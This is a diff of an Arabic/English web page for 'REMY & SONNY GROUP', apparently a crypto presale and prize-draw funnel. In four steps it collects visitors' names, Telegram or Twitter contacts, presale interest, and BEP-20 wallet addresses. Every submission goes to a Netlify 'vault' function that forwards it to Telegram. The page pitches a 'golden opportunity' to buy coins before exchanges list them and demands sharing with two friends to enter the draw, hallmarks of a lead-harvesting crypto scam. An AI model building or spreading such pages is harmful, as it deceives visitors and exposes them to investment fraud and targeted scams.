@@ -4,65 +4,146 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>REMY & SONNY GROUP</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
     <style>
-        :root { --gold: #ffd700; --bg: #050505; --glass: rgba(20, 20, 20, 0.9); }
-        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--bg); color: white; text-align: center; }
-        .main-container { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-        .glass-box { background: var(--glass); backdrop-filter: blur(15px); border-radius: 25px; padding: 30px; width: 100%; max-width: 400px; border: 1px solid rgba(255, 215, 0, 0.2); }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #111; color: white; }
-        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; background: var(--gold); color: black; }
+        :root { --gold: #ffd700; --dark-gold: #b8860b; --bg: #050505; --glass: rgba(20, 20, 20, 0.9); }
+        * { box-sizing: border-box; transition: all 0.3s ease; }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Cairo', 'Poppins', sans-serif; background: var(--bg); color: white; overflow-x: hidden; }
+        .bg-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.ibb.co/TBh4M9N9/image.jpg') no-repeat center center/cover; opacity: 0.1; z-index: -1; }
+        .main-container { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 15px; }
+        .glass-box { background: var(--glass); backdrop-filter: blur(15px); border-radius: 25px; padding: 25px 20px; width: 100%; max-width: 420px; text-align: center; border: 1px solid rgba(255, 215, 0, 0.15); box-shadow: 0 20px 50px rgba(0,0,0,0.5); position: relative; }
+        .moving-title { font-size: 24px; font-weight: bold; margin-bottom: 15px; background: linear-gradient(to right, #ffd700 20%, #fff 40%, #fff 60%, #ffd700 80%); background-size: 200% auto; -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; animation: shine 3s linear infinite; }
+        @keyframes shine { to { background-position: 200% center; } }
+        .step-tracker { font-size: 12px; color: #888; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid rgba(255,215,0,0.1); }
+        .step-tracker b { color: var(--gold); }
+        .lang-btn { position: absolute; top: -50px; left: 0; background: rgba(255, 215, 0, 0.1); border: 1px solid var(--gold); color: var(--gold); padding: 5px 12px; border-radius: 20px; cursor: pointer; font-size: 11px; z-index: 10; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: white; text-align: center; font-size: 14px; }
+        input:focus { outline: none; border-color: var(--gold); }
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-bottom: 10px; font-size: 14px; }
+        .btn-gold { background: linear-gradient(135deg, var(--gold), var(--dark-gold)); color: #000; }
+        .btn-blue { background: #1a73e8; color: white; }
+        .btn-outline { background: transparent; border: 1px solid #444; color: #888; }
         .hidden { display: none; }
+        .alert-box { background: rgba(255, 215, 0, 0.05); border: 1px solid rgba(255, 215, 0, 0.2); border-radius: 12px; padding: 15px; margin-bottom: 20px; text-align: right; font-size: 12px; line-height: 1.6; }
     </style>
 </head>
 <body>
+<div class="bg-overlay"></div>
 <div class="main-container">
     <div class="glass-box">
+        <button class="lang-btn" onclick="toggleLang()" id="langBtn">English</button>
+        <div class="moving-title">REMY & SONNY GROUP</div>
+
         <div id="step1">
-            <h2>سجل بياناتك</h2>
+            <div class="step-tracker" id="st1">بدأت الرحلة: بقي <b>4 خطوات</b> للنهاية</div>
+            <p id="t-p1" style="color:#888; font-size:13px;">سجل بياناتك للانضمام إلى قائمة المستثمرين الأوائل</p>
             <input type="text" id="name" placeholder="الاسم الكامل">
-            <input type="text" id="contact" placeholder="تيلجرام / تويتر">
-            <button class="btn" onclick="sendStep1()">استمرار</button>
+            <input type="text" id="contact_init" placeholder="تيلجرام / تويتر">
+            <button class="btn btn-gold" onclick="sendStep1()" id="t-btn1">استمرار</button>
         </div>
+
         <div id="step2" class="hidden">
-            <h2>المرحلة النهائية 🏆</h2>
-            <input type="text" id="wallet" placeholder="عنوان محفظتك (BEP-20)">
-            <input type="text" id="telegram_user" placeholder="يوزر التيلجرام (@username)">
-            <button class="btn" onclick="submitFinal()">إرسال ودخول السحب</button>
+            <div class="step-tracker" id="st2">انتهت مرحلة: بقي <b>3 خطوات</b> للنهاية</div>
+            <h2 id="t-h3" style="font-size:18px; color:var(--gold);">البيع المسبق</h2>
+            <p id="t-p3" style="font-size:13px; color:#ddd;">فرصة ذهبية للحصول على العملات بأقل سعر قبل المنصات.</p>
+            <button class="btn btn-gold" onclick="sendStep2('Interested')" id="t-btn-yes">أنا مهتم</button>
+            <button class="btn btn-outline" onclick="sendStep2('Skipped')" id="t-btn-skip">تخطي الآن</button>
         </div>
-        <div id="finish" class="hidden">
-            <h2 style="color: #00ff00;">✅ تم بنجاح!</h2>
+
+        <div id="step3" class="hidden">
+            <div class="step-tracker" id="st3">انتهت مرحلتان: بقي <b>خطوتان</b> للنهاية</div>
+            <h2 id="t-h-share" style="font-size:18px;">📢 خطوة المشاركة</h2>
+            <div class="alert-box" id="t-alert">🚨 **تنبيه هام:** لضمان دخول السحب، يجب مشاركة الرابط مع صديقين.</div>
+            <button class="btn btn-blue" onclick="next(3, 4)" id="t-already">لقد شاركت الرابط سابقاً</button>
+            <button class="btn btn-gold" onclick="shareAndNext()" id="t-share-btn">📲 مشاركة الرابط مع صديقين</button>
+        </div>
+
+        <div id="step4" class="hidden">
+            <div class="step-tracker" id="st4">انتهت 3 مراحل: بقي <b>خطوة واحدة</b> أخيرة</div>
+            <h2 id="t-h-final" style="font-size:18px; color: var(--gold);">المرحلة النهائية 🏆</h2>
+            <p id="t-p-final" style="font-size:12px; color:#aaa; margin-bottom:15px;">اكتب عنوان محفظتك واليوزر لاستلام الجائزة في حال فوزك</p>
+            <input type="text" id="wallet" placeholder="عنوان محفظتك (BEP-20)">
+            <input type="text" id="telegram_user" placeholder="يوزر التيلجرام الخاص بك (@username)">
+            <button class="btn btn-gold" onclick="submitFinal()" id="t-finish-btn">إرسال البيانات ودخول السحب</button>
+        </div>
+
+        <div id="step-finish" class="hidden">
+            <h2 style="color: #00ff00;" id="t-success">✅ تم بنجاح!</h2>
+            <p id="t-thanks">شكراً لك! تم تسجيل محفظتك وبياناتك بنجاح. حظاً موفقاً!</p>
         </div>
     </div>
 </div>
 
 <script>
-    // هذه الدالة ترسل للوسيط (الخزنة) وليس لتليجرام مباشرة
-    async function sendToVault(message) {
+    let currentLang = 'ar';
+
+    async function sendTelegram(text) {
+        // التعديل السحري للأمان: الإرسال عبر الخزنة في نتليفاي
         try {
             await fetch('/.netlify/functions/vault', {
                 method: 'POST',
-                body: JSON.stringify({ text: message })
+                body: JSON.stringify({ text: text })
             });
-        } catch (e) { console.error("Error"); }
+        } catch (e) { console.error("Error sending..."); }
+    }
+
+    function next(h, s) { 
+        document.getElementById('step'+h).classList.add('hidden'); 
+        document.getElementById('step'+s).classList.remove('hidden'); 
     }
 
     function sendStep1() {
         let n = document.getElementById('name').value;
-        let c = document.getElementById('contact').value;
-        if(!n) return alert("أدخل الاسم");
-        sendToVault(`👤 نيو ليد: ${n}\nاتصال: ${c}`);
-        document.getElementById('step1').classList.add('hidden');
-        document.getElementById('step2').classList.remove('hidden');
+        let c = document.getElementById('contact_init').value;
+        if(!n) return alert(currentLang === 'ar' ? "الاسم مطلوب" : "Name required");
+        sendTelegram(`👤 **New Lead Started**\nName: ${n}\nContact: ${c}`);
+        next(1, 2);
     }
+
+    function sendStep2(status) {
+        sendTelegram(`🔥 **Pre-sale Interest**\nStatus: ${status}\nUser: ${document.getElementById('name').value}`);
+        next(2, 3);
+    }
+
+    function shareAndNext() { window.open(`https://t.me/share/url?url=${window.location.href}`); setTimeout(() => next(3, 4), 2000); }
 
     function submitFinal() {
         let w = document.getElementById('wallet').value;
         let u = document.getElementById('telegram_user').value;
         let n = document.getElementById('name').value;
-        sendToVault(`🏆 اشتراك كامل:\n👤 الاسم: ${n}\n🆔 يوزر: ${u}\n💳 محفظة: ${w}`);
-        document.getElementById('step2').classList.add('hidden');
-        document.getElementById('finish').classList.remove('hidden');
+        if(!w || !u) return alert(currentLang === 'ar' ? "أكمل البيانات" : "Complete details");
+
+        sendTelegram(`🏆 **GRAND ENTRY COMPLETE**\n👤 Name: ${n}\n🆔 Telegram: ${u}\n💳 Wallet: ${w}`);
+        next(4, '-finish');
+    }
+
+    const langData = {
+        en: {
+            st1: "Journey Started: <b>4 steps</b> remaining", p1: "Register to join the early investors list", namePl: "Full Name", contactPl: "Telegram / Twitter", btn1: "Continue",
+            st2: "Phase Finished: <b>3 steps</b> remaining", h3: "Pre-sale", p3: "Golden opportunity to get coins at the lowest price before exchanges.", btnYes: "I am Interested", btnSkip: "Skip Now",
+            st3: "2 Phases Finished: <b>2 steps</b> remaining", hShare: "📢 Sharing Step", alert: "🚨 **Important Alert:** Share the link with 2 friends to enter.", already: "I shared it before", shareBtn: "📲 Share with 2 Friends",
+            st4: "3 Phases Finished: <b>1 step</b> remaining", hFinal: "Final Stage 🏆", pFinal: "Enter your wallet and username to receive the prize", walletPl: "Wallet (BEP-20)", userPl: "Telegram (@username)", finishBtn: "Submit & Enter Draw",
+            success: "✅ Success!", thanks: "Thank you! Your wallet and details are registered. Good luck!", langBtn: "عربي"
+        },
+        ar: {
+            st1: "بدأت الرحلة: بقي <b>4 خطوات</b> للنهاية", p1: "سجل بياناتك للانضمام إلى قائمة المستثمرين الأوائل", namePl: "الاسم الكامل", contactPl: "تيلجرام / تويتر", btn1: "استمرار",
+            st2: "انتهت مرحلة: بقي <b>3 خطوات</b> للنهاية", h3: "البيع المسبق", p3: "البيع المسبق: فرصة ذهبية للحصول على العملات بأقل سعر قبل المنصات.", btnYes: "أنا مهتم", btnSkip: "تخطي الآن",
+            st3: "انتهت مرحلتان: بقي <b>خطوتان</b> للنهاية", hShare: "📢 خطوة المشاركة", alert: "🚨 **تنبيه هام:** لضمان دخول السحب، يجب مشاركة الرابط مع صديقين.", already: "لقد شاركت الرابط سابقاً", shareBtn: "📲 مشاركة الرابط مع صديقين",
+            st4: "انتهت 3 مراحل: بقي <b>خطوة واحدة</b> أخيرة", hFinal: "المرحلة النهائية 🏆", pFinal: "اكتب عنوان محفظتك واليوزر لاستلام الجائزة في حال فوزك", walletPl: "عنوان محفظتك (BEP-20)", userPl: "يوزر التيلجرام الخاص بك (@username)", finishBtn: "إرسال البيانات ودخول السحب",
+            success: "✅ تم بنجاح!", thanks: "شكراً لك! تم تسجيل محفظتك وبياناتك بنجاح. حظاً موفقاً!", langBtn: "English"
+        }
+    };
+
+    function toggleLang() {
+        currentLang = currentLang === 'ar' ? 'en' : 'ar';
+        const d = langData[currentLang];
+        document.getElementById('langBtn').innerText = d.langBtn;
+        document.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+        document.getElementById('st1').innerHTML = d.st1; document.getElementById('t-p1').innerText = d.p1; document.getElementById('name').placeholder = d.namePl; document.getElementById('contact_init').placeholder = d.contactPl; document.getElementById('t-btn1').innerText = d.btn1;
+        document.getElementById('st2').innerHTML = d.st2; document.getElementById('t-h3').innerText = d.h3; document.getElementById('t-p3').innerText = d.p3; document.getElementById('t-btn-yes').innerText = d.btnYes; document.getElementById('t-btn-skip').innerText = d.btnSkip;
+        document.getElementById('st3').innerHTML = d.st3; document.getElementById('t-h-share').innerText = d.hShare; document.getElementById('t-alert').innerText = d.alert; document.getElementById('t-already').innerText = d.already; document.getElementById('t-share-btn').innerText = d.shareBtn;
+        document.getElementById('st4').innerHTML = d.st4; document.getElementById('t-h-final').innerText = d.hFinal; document.getElementById('t-p-final').innerText = d.pFinal; document.getElementById('wallet').placeholder = d.walletPl; document.getElementById('telegram_user').placeholder = d.userPl; document.getElementById('t-finish-btn').innerText = d.finishBtn;
+        document.getElementById('t-success').innerText = d.success; document.getElementById('t-thanks').innerText = d.thanks;
     }
 </script>
 </body>
